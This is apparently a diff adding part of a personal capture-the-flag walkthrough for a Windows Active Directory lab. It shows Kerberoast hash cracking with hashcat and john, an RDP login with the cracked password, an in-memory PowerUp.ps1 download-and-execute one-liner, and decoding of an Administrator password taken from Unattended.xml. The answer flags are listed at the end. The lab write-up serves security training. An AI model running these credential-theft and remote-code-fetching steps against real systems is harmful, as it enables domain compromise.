@@ -309,3 +309,159 @@ Cracking performance lower than expected?
   https://hashcat.net/faq/morework
 
 $krb5tgs$23$*fela$corp.local$HTTP/fela*$30ba38d229ee3d103b1318563f83e9a1$cdd4cf4465cdac959f32cfd1ac71296a748d58cef6eeea0d4076fed0c2799055c5c0536f86c65d78c44a5538c0f9222a005a5a2e3ecc086010aabf5c9e880418e0bab2ad0ae8a6fd5e17b685878d115e814c9615940286af8cf1ec40e1560d6325ff4a46522ceb7e377ff765adf165e6b802b035b124279011e71220572b95a88457450848eaab4171b6a55c3eba9409e7a14372db25358edb748911663d6ae7dcb06d7748ed16cbb386e4a61459bd1286478e744f7f5e67298ccd70384572ae958b0507e888d53577fad812b13d01510c79e5160aae49901d1b465624836c0f2a53e29abf93095ecc6a1aa445f4383e0012fbeebe6a9501dd328799f0d70eb09d6210095275690c392025c38fe56dbf52775e41adcdd32bcf5ad7e61dc8ead114b7680f39c0df84c1941585b273e192343bb3dbe01c6d8226c985fc53aad48443786e64b436fc8de43e5546155b2170ca8f09245678879590ebff2258dedd52ee0f850e17181d3fc9c4828e43c3bb4ee4c4e08a17a9331e34ff25430e57ce6ac27004cc91d72ff3936cd02891e4e266c303f09c70efc2d13074b9d43db08fd992d592fabf618d64f583187241e7b0ab00558ebe267290dc8080ad216f67991da138efd92cb18b95a70969c9de528503b897f4991f87f3ae0ccc28089f789ce990e712acc5dcddf37cc61a45cd95d7e532da30ceba454a5163ebf1ce267c5ff88150e3beabc8cb92d76001e2fca338648bd689884f9bac6c536eac2a0119b0930c0ef638f486c3610929aedaeb47c9d463bbde25938fcdf6396d7b04858977575c307525f7edd170c4f2a7319edeb11386344becb56224a3a37adc6bb1cf8e0b9088f36108d3fd31dcd80ecde7dda7b3f977731bfea14f537c0f4b32e5a853164ee07ed279b8574ceb625afb79a3c6f123fb2d57f85461ef2a034100387d5b081b164ff8b15dfd5aeda0de11a948d24cd4aea0f48a83dfad5e521d81c7494257584dc4270b746eba09c500288bd0aadfc3545f08e783a7dbc7ed58453dab7748e9ee3f201f10a87c01553f712289537257f6479471de6c9d36cf9bc7fa4c444313c10450bda22b2f8bae866b705c34372d3af01b32acd4bf2d6162adb6afe876481b74c84c776d12ca1cba8906f720f710a76ca0237b7e50f6c24e200343d1f08fc57d65a31cfc55723d535c384ba3d486bcacfda5afeac8501dbf9982596f000d766caab6d9dad73f5b27dd5bdb52b8a3ccd3537abfa02a84dfd0ba380dfda0b52a4de4c5f4e9c76053924b7464b7acf0f6caf93c3cffb467d1edff615f31ec9e109e7680f0ad9c421af18521c18c9626aa6a44137b824911dfa92fa5759d88dff49f43d23266ea8ec35f1d3af1dbdeb15e37cd9ca6e86f3c7bd8be294226210b:rubenF124
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*fela$corp.local$HTTP/fela*$30ba38d229e...26210b
+Time.Started.....: Wed Sep 28 17:05:50 2022 (13 secs)
+Time.Estimated...: Wed Sep 28 17:06:03 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   407.3 kH/s (0.75ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 4132864/14344385 (28.81%)
+Rejected.........: 0/4132864 (0.00%)
+Restore.Point....: 4131840/14344385 (28.80%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: rubichato -> ruben53
+Hardware.Mon.#1..: Util: 46%
+
+Started: Wed Sep 28 17:05:43 2022
+Stopped: Wed Sep 28 17:06:05 2022
+
+or
+```
+```text
+┌──(kali㉿kali)-[~/corp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+rubenF124        (?)     
+1g 0:00:00:03 DONE (2022-09-28 17:07) 0.3267g/s 1350Kp/s 1350Kc/s 1350KC/s rubibrian7..ruben4484
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+```text
+
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ xfreerdp /u:'fela' /p:'rubenF124' /v:10.10.62.161 /size:85%
+
+flag{bde1642535aa396d2439d86fe54a36e4}
+```
+Login as this user. What is his flag?
+Look on their desktop.
+
+## Privilege Escalation
+We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.
+We will run PowerUp.ps1 for the enumeration.
+Lets load PowerUp1.ps1 into memory.
+iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
+The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.
+"Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." Read more about it here.
+It is also where users passwords are stored in base64. Navigate to C:\Windows\Panther\Unattend\Unattended.xml.
+![](https://i.imgur.com/IMU9bcO.png)
+```text
+┌──(kali㉿kali)-[~/corp]
+└─$ wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1                          
+--2022-09-28 17:10:30--  https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.109.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 494860 (483K) [text/plain]
+Saving to: ‘PowerUp.ps1’
+
+PowerUp.ps1                      100%[=======================================================>] 483.26K  --.-KB/s    in 0.05s   
+
+2022-09-28 17:10:31 (9.51 MB/s) - ‘PowerUp.ps1’ saved [494860/494860]
+```
+```text
+┌──(kali㉿kali)-[~/corp]
+└─$ ls
+hash.txt  hello.c  hello.exe  Invoke-Kerberoast.ps1  PowerUp.ps1
+
+again go to c:\windows\system32\cmd
+```
+```text
+┌──(kali㉿kali)-[~/corp]
+└─$ python3 -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.62.161 - - [28/Sep/2022 17:12:20] "GET /PowerUp.ps1 HTTP/1.1" 200 -
+
+PS C:\Windows\System32> cd C:\Users\fela.CORP
+PS C:\Users\fela.CORP> Invoke-WebRequest -Uri 'http://10.11.81.220:8000/PowerUp.ps1' -OutFile 'PowerUp.ps1'
+PS C:\Users\fela.CORP> . .\PowerUp.ps1
+
+PS C:\Users\fela.CORP> Invoke-AllChecks
+
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+
+[*] Checking for unquoted service paths...
+
+[*] Checking service executable and argument permissions...
+
+[*] Checking service permissions...
+
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+HijackablePath : C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\
+AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
+                 -Command '...'
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+[*] Checking for Autologon credentials in registry...
+
+[*] Checking for vulnerable registry autoruns and configs...
+
+[*] Checking for vulnerable schtask files/configs...
+
+[*] Checking for unattended install files...
+
+UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml
+
+[*] Checking for encrypted web.config strings...
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+PS C:\Users\fela.CORP> more C:\Windows\Panther\Unattend\Unattended.xml
+<AutoLogon>
+    <Password>
+        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
+        <PlainText>false</PlainText>
+    </Password>
+    <Enabled>true</Enabled>
+    <Username>Administrator</Username>
+</AutoLogon>
+
+dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=
+
+base64
+
+tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
+
+When you will connect as administrator, you will be prompted to change the password. Make sure you set up a strong password, else you’ll have to type the password again :).
+```
+![[Pasted image 20220928162056.png]]
+What is the decoded password?
+**
+Now we have the Administrator's password, login as them and obtain the last flag.
+
+## Flags / Answers
+- ***flag{a12a41b5f8111327690f836e9b302f0b}***
+- ***flag{bde1642535aa396d2439d86fe54a36e4}***
+- ***THM{g00d_j0b_SYS4DM1n_M4s73R}***
+
+## Notes / Lessons Learned
+[[Retro]]
+
